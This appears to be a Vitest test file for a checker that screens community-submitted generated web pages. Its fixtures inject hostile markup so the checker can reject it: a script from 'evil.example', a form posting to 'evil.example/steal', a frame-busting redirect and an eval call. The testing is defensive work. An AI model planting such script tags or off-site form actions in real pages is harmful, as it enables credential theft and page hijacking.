import { describe, expect, it } from "vitest";
import { checkPageSource } from "../scripts/community/page-checks.mjs";

const clean = `<!doctype html><html><head><script src="https://cdn.tailwindcss.com"></script></head>
<body><form onsubmit="event.preventDefault()"><input type="email"></form></body></html>`;

describe("community page checks", () => {
  it("passes a normal generated page", () => {
    expect(checkPageSource(clean, "html")).toMatchObject({
      verdict: "pass",
      findings: [],
    });
  });

  it("blocks external scripts, off-site forms and frame-busting", () => {
    const bad = clean
      .replace(
        "</head>",
        '<script src="https://evil.example/x.js"></script></head>',
      )
      .replace(
        '<form onsubmit="event.preventDefault()">',
        '<form action="https://evil.example/steal">',
      )
      .replace(
        "</body>",
        "<script>top.location = 'https://evil.example'</script></body>",
      );
    const r = checkPageSource(bad, "html");
    expect(r.verdict).toBe("reject");
    expect(r.findings.map((f) => f.rule).sort()).toEqual([
      "external-script",
      "form-posts-externally",
      "frame-busting",
    ]);
  });

  it("blocks obfuscated payloads and paid-template markers", () => {
    expect(
      checkPageSource(
        clean.replace("</body>", "<script>eval(x)</script></body>"),
        "html",
      ).verdict,
    ).toBe("reject");
    expect(
      checkPageSource(
        clean.replace("</body>", "<p>© 2024 ThemeForest</p></body>"),
        "html",
      ).verdict,
    ).toBe("reject");
  });

  it("asks for a look at password fields and network calls", () => {
    const r = checkPageSource(
      clean
        .replace('type="email"', 'type="password"')
        .replace("</body>", "<script>fetch('/x')</script></body>"),
      "html",
    );
    expect(r.verdict).toBe("review");
    expect(r.findings.every((f) => f.level === "warn")).toBe(true);
  });

  it("checks JSX shape", () => {
    expect(
      checkPageSource("function App(){return null}", "jsx").findings[0].rule,
    ).toBe("no-default-export");
    expect(
      checkPageSource("export default function App(){return null}", "jsx")
        .verdict,
    ).toBe("pass");
  });
});
